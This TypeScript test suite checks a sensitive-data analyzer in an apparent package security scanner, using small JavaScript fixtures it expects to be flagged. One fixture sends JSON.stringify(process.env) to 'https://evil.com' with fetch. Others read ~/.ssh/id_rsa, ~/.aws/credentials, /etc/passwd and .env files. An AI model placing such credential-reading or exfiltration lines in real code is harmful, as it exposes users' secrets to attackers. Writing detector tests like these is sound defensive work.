import { mkdtemp, writeFile, rm, mkdir } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { SensitiveDataAnalyzer } from '../../../src/analyzers/sensitive-data/index.js';
import { createMockContext } from '../../helpers.js';

describe('SensitiveDataAnalyzer', () => {
  let analyzer: SensitiveDataAnalyzer;
  let tempDir: string;

  beforeEach(async () => {
    analyzer = new SensitiveDataAnalyzer();
    tempDir = await mkdtemp(join(tmpdir(), 'mitnick-sensitive-test-'));
  });

  afterEach(async () => {
    await rm(tempDir, { recursive: true, force: true });
  });

  it('has correct name and description', () => {
    expect(analyzer.name).toBe('sensitive-data');
    expect(analyzer.description).toBeTruthy();
  });

  it('returns no findings for clean code', async () => {
    await writeFile(
      join(tempDir, 'clean.js'),
      `
const add = (a, b) => a + b;
module.exports = { add };
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    expect(result.findings).toHaveLength(0);
  });

  it('detects process.env access (info for few occurrences)', async () => {
    await writeFile(
      join(tempDir, 'env.js'),
      `
const port = process.env.PORT;
const host = process.env.HOST;
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const envFinding = result.findings.find((f) => f.title.includes('process.env access'));
    expect(envFinding).toBeDefined();
    expect(envFinding!.severity).toBe('info');
  });

  it('flags excessive process.env access (>5 occurrences) as high', async () => {
    await writeFile(
      join(tempDir, 'many-env.js'),
      `
const a = process.env.A;
const b = process.env.B;
const c = process.env.C;
const d = process.env.D;
const e = process.env.E;
const f = process.env.F;
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const excessive = result.findings.find((f) => f.title.includes('Excessive process.env access'));
    expect(excessive).toBeDefined();
    expect(excessive!.severity).toBe('high');
  });

  it('detects bulk env harvesting via Object.keys(process.env)', async () => {
    await writeFile(
      join(tempDir, 'harvest.js'),
      `
const keys = Object.keys(process.env);
console.log(keys);
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const bulkFinding = result.findings.find((f) =>
      f.title.includes('Bulk environment variable harvesting'),
    );
    expect(bulkFinding).toBeDefined();
    expect(bulkFinding!.severity).toBe('high');
  });

  it('detects bulk env harvesting via JSON.stringify(process.env)', async () => {
    await writeFile(
      join(tempDir, 'stringify.js'),
      `
const envStr = JSON.stringify(process.env);
fetch("https://evil.com", { body: envStr });
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const bulkFinding = result.findings.find((f) =>
      f.title.includes('Bulk environment variable harvesting'),
    );
    expect(bulkFinding).toBeDefined();
  });

  it('detects sensitive file path references (~/.ssh)', async () => {
    await writeFile(
      join(tempDir, 'ssh.js'),
      `
const fs = require("fs");
const key = fs.readFileSync("~/.ssh/id_rsa", "utf-8");
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const sshFinding = result.findings.find((f) => f.title.includes('~/.ssh'));
    expect(sshFinding).toBeDefined();
    expect(sshFinding!.severity).toBe('critical');
  });

  it('detects sensitive file path references (~/.aws)', async () => {
    await writeFile(
      join(tempDir, 'aws.js'),
      `
const config = require("fs").readFileSync("~/.aws/credentials");
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const awsFinding = result.findings.find((f) => f.title.includes('~/.aws'));
    expect(awsFinding).toBeDefined();
    expect(awsFinding!.severity).toBe('critical');
  });

  it('detects sensitive file path references (/etc/passwd)', async () => {
    await writeFile(
      join(tempDir, 'passwd.js'),
      `
const users = require("fs").readFileSync("/etc/passwd", "utf-8");
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const passwdFinding = result.findings.find((f) => f.title.includes('/etc/passwd'));
    expect(passwdFinding).toBeDefined();
    expect(passwdFinding!.severity).toBe('critical');
  });

  it('detects .env file path reference', async () => {
    await writeFile(
      join(tempDir, 'dotenv.js'),
      `
const envContent = require("fs").readFileSync(".env", "utf-8");
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const envFileFinding = result.findings.find((f) => f.title.includes('.env'));
    expect(envFileFinding).toBeDefined();
  });

  it('detects credential file pattern references (.pem)', async () => {
    await writeFile(
      join(tempDir, 'cert.js'),
      `
const cert = require("fs").readFileSync("server.pem");
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const pemFinding = result.findings.find((f) => f.title.includes('Credential file reference'));
    expect(pemFinding).toBeDefined();
    expect(pemFinding!.severity).toBe('critical');
  });

  it('detects credential file pattern references (id_rsa)', async () => {
    await writeFile(
      join(tempDir, 'rsa.js'),
      `
const key = require("fs").readFileSync("id_rsa");
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const rsaFinding = result.findings.find((f) => f.title.includes('Credential file reference'));
    expect(rsaFinding).toBeDefined();
  });

  it('detects credential file pattern references (credentials.json)', async () => {
    await writeFile(
      join(tempDir, 'creds.js'),
      `
const creds = require("./credentials.json");
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const credsFinding = result.findings.find((f) => f.title.includes('Credential file reference'));
    expect(credsFinding).toBeDefined();
  });

  it('detects sensitive environment variable name patterns', async () => {
    await writeFile(
      join(tempDir, 'secrets.js'),
      `
const key = process.env["API_KEY"];
const secret = process.env["SECRET"];
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const sensitiveEnv = result.findings.find((f) =>
      f.title.includes('Sensitive environment variable names'),
    );
    expect(sensitiveEnv).toBeDefined();
    expect(sensitiveEnv!.severity).toBe('high');
  });

  it('does not flag sensitive env names if process.env is not accessed', async () => {
    await writeFile(
      join(tempDir, 'no-env.js'),
      `
const key = "API_KEY";
const secret = "SECRET";
`,
    );

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const sensitiveEnv = result.findings.find((f) =>
      f.title.includes('Sensitive environment variable names'),
    );
    expect(sensitiveEnv).toBeUndefined();
  });

  it('analyzes files in subdirectories', async () => {
    const subDir = join(tempDir, 'lib');
    await mkdir(subDir, { recursive: true });
    await writeFile(join(subDir, 'config.js'), `const x = process.env.PORT;\n`);

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);

    const finding = result.findings.find((f) => f.title.includes('process.env'));
    expect(finding).toBeDefined();
    expect(finding!.file).toBe(join('lib', 'config.js'));
  });

  it('skips non-analyzable file extensions', async () => {
    await writeFile(join(tempDir, 'readme.md'), '# References process.env.SECRET');

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);
    expect(result.findings).toHaveLength(0);
  });

  it('returns no findings for an empty directory', async () => {
    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);
    expect(result.findings).toHaveLength(0);
  });

  it('handles non-existent extractedPath gracefully', async () => {
    const ctx = createMockContext({ extractedPath: '/tmp/nonexistent-dir-sensitive' });
    const result = await analyzer.analyze(ctx);
    expect(result.findings).toHaveLength(0);
  });

  it('handles files with syntax errors gracefully', async () => {
    await writeFile(join(tempDir, 'broken.js'), `const x = {{{{{ not valid`);

    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);
    expect(result.analyzer).toBe('sensitive-data');
  });

  it('returns duration', async () => {
    const ctx = createMockContext({ extractedPath: tempDir });
    const result = await analyzer.analyze(ctx);
    expect(result.duration).toBeGreaterThanOrEqual(0);
  });
});
